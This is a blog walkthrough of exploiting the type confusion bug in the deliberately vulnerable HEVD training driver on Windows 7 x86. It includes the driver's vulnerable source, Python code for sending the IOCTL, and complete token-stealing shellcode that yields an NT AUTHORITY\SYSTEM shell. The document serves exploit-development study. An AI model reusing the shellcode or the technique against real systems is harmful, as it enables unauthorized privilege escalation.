---
layout: single
title: HEVD - Windows 7 x86 Kernel Type Confusion
---

Walkthrough for the HEVD Windows Kernel Driver exploitation, exploiting a Kernel level Type Confusion bug vulnerability.

----

**What are Type Confusion bugs?**

Type Confusion bugs fall into the memory corruption class family, Type Confusion bugs tend to be highly exploitable, and there a lot of in-the-wild instances of Type Confusions being exploited (commonly in Browsers like Chromes V8 Engine).

Type Confusion occurs when a program allocates resources like a pointer or variable using one type, but later on, the program tries to access the same resources using a type that is not compatible with the original setting. This is the Type *confusion*, where the types of not compatible and thus leads to a vulnerability.

So when an application doesn't verify the type of object it's processing and then processes it as some other object, an attacker can abuse this.

----

**Bugs in Kernel-mode**

Since this is dealing with a Kernel-mode driver (HEVD), we will need to utilize an IOCTL and the same `CreateFileA()` and `DeviceIoControl()` functions to establish and obtain communication to a kernel-mode driver.

----

**HEVD vulnerable code analysis**

```c++
#ifdef SECURE
        //
        // Secure Note: This is secure because the developer is properly setting 'Callback'
        // member of the 'KERNEL_TYPE_CONFUSION_OBJECT' structure before passing the pointer
        // of 'KernelTypeConfusionObject' to 'TypeConfusionObjectInitializer()' function as
        // parameter
        //

        KernelTypeConfusionObject->Callback = &TypeConfusionObjectCallback;
        Status = TypeConfusionObjectInitializer(KernelTypeConfusionObject);
#else
        DbgPrint("[+] Triggering Type Confusion\n");

        //
        // Vulnerability Note: This is a vanilla Type Confusion vulnerability due to improper
        // use of the 'UNION' construct. The developer has not set the 'Callback' member of
        // the 'KERNEL_TYPE_CONFUSION_OBJECT' structure before passing the pointer of
        // 'KernelTypeConfusionObject' to 'TypeConfusionObjectInitializer()' function as
        // parameter
        //

        Status = TypeConfusionObjectInitializer(KernelTypeConfusionObject);
```

(This code is taken from the TypeConfusion.c file from the HEVD source release.)

As far as good and secure practices go, the first example of a secure program functionality show, 

```c++
KernelTypeConfusionObject->Callback = &TypeConfusionObjectCallback;
Status = TypeConfusionObjectInitializer(KernelTypeConfusionObject);
```

It's secure since the code is properly setting the `Callback` function before passing it to `KernelTypeConfusionObject` which is stored in a variable.

```c++
Status = TypeConfusionObjectInitializer(KernelTypeConfusionObject);
```
The vulnerable code is obvious since it's simply not properly setting the `Callback` before it is passing the pointer on to `KernelTypeConfusionObject` 

```c++
NTSTATUS
TypeConfusionObjectInitializer(
    _In_ PKERNEL_TYPE_CONFUSION_OBJECT KernelTypeConfusionObject
)
{
    NTSTATUS Status = STATUS_SUCCESS;

    PAGED_CODE();

    DbgPrint("[+] KernelTypeConfusionObject->Callback: 0x%p\n", KernelTypeConfusionObject->Callback);
    DbgPrint("[+] Calling Callback\n");

    KernelTypeConfusionObject->Callback();

    DbgPrint("[+] Kernel Type Confusion Object Initialized\n");

    return Status;
}
```

Within the `TypeConfusionObjectInitializer` function, there is the `PKERNEL_TYPE_CONFUSION_OBJECT` structure. This 
function will take an object and calls the function pointer which is in the object. 

The structure layout for `PKERNEL_TYPE_CONFUSION_OBJECT` structure is in TypeConfusion.h

```c++
typedef struct _USER_TYPE_CONFUSION_OBJECT
{
    ULONG_PTR ObjectID;
    ULONG_PTR ObjectType;
} USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT;

#pragma warning(push)
#pragma warning(disable : 4201)
typedef struct _KERNEL_TYPE_CONFUSION_OBJECT
{
    ULONG_PTR ObjectID;
    union
    {
        ULONG_PTR ObjectType;
        FunctionPointer Callback;
    };
} KERNEL_TYPE_CONFUSION_OBJECT, *PKERNEL_TYPE_CONFUSION_OBJECT;
```
Essentially,

There are two structures, a user-mode object and a kernel-mode one. The user-mode one takes an `ObjectID` and a `ObjectType` as two members, but the kernel-mode structure is a UNION, and a UNION can only hold one member at a time, and since the kernel-mode one (UNION one) has two, the `ObjectType` and the `Callback`. This is where the confusion actually occurs. When the `TriggerTypeConfusion` function doesn't validate that the second member that is passed is the `ObjectType` or `Callback`

![union holds one](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/union-one.png)

You can probably already guess how the attack will play out.

----

**Driver communication & BSOD**

To set up an initial connection to the Device driver (in kernel land), we need an IOCTL. We can use IDA Pro for IOCTL discovery within the driver or check the HEVD source code.

```c++
#define HEVD_IOCTL_TYPE_CONFUSION                                IOCTL(0x808)
```

(from HackSysExtremeVulnerableDriver.h's IOCTL CTL_CODE macro definitions)

This IOCTL can be decoded with python to:

![macro calculation](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/macro.png)

After obtaining an IOCTL (0x222023) from the driver, we can utilize the CreateFileA() function to receive a handler to the drive. 

```python
device_handle = kernel32.CreateFileA("\\\\.\HackSysExtremeVulnerableDriver",
                                        0xC0000000,
                                        0,
                                        None,
                                        0x3,
                                        0,
                                        None)
```

After obtaining and opening a handler to the device, we can use the DeviceIoControl() function combined with our previously obtained IOCTL to send data to the driver.

```python
sending_payload = kernel32.DeviceIoControl(device_handle,
                            0x222023,
                            buffer_pointer,
                            buffer_size,
                            None, 0,
                            byref(c_ulong(), 0))
```

For exploitation puposes, all you need to do is pass a structure who's second member is the address of the function you want to call from kernel-land, in this case thats the pointer and address to our shellcode payload.

----

**Token stealing shellcode payload**

As a payload to obtain NT\Authority System privileges, we will be using the same token-stealing shellcode payload as seen in previous HEVD exploitation posts.

```python

token_stealing_shellcode = (
"\x60"                            # pushad
"\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
"\x8b\x40\x50"                    # mov eax,[eax+0x50]
"\x89\xc1"                        # mov ecx,eax
"\xba\x04\x00\x00\x00"            # mov edx,0x4
"\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
"\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
"\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
"\x75\xed"                        # jnz 0x1a
"\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]
"\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
"\x61"                            # popad
"\x31\xC0"                        # NTSTATUS -> STATUS_SUCCESS
"\x5D"                            # pop ebp
"\xC2\x08\x00"                    # ret 8
# cleanup routine
"\x61"                            # popad
"\xc3"                            # ret
)

```

We can add a cleanup routine at the end of our shellcode payload to ensure it doesn't only last one time before the system goes BSOD. This is a POPAD followed by a RET, this will push all the register values to the stack and return to the normal program flow.

----

**Gaining full exploitation & EOP**

Now that we have the IOCTL, both functions to communicate with the driver, a pointer to out shellcode payload, and the proper cleanup function in our assembly shellcode payload, we can run the exploit against HEVD.sys

![EOP](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/typeconfusion_eop.png)

And you are presented with an NT AUTHORITY\SYSTEM spawned command prompt.

----

**Conclusion**

After finding an IOCTL and calculating it's values, we can communicate with a kernel-mode driver (HEVD.sys) and utilize a Type Confusion bug within a certain function in which we pass our IOCTL, buffer pointer, and buffer size to. Unlike the standard stack-based buffer overflow where you send the IOCTL, buffer ID, and the buffer size. Since we sent that pointer, we can take advantage of the Type Confusion bug. Giving us EOP (Escalation Of Privileges) and obtaining an NT AUTHORITY\SYSTEM shell on the system.

The full exploit code can be found [here](https://github.com/FULLSHADE/Windows-Kernel-Exploitation-HEVD/blob/master/HEVD_TypeConfusion.py)
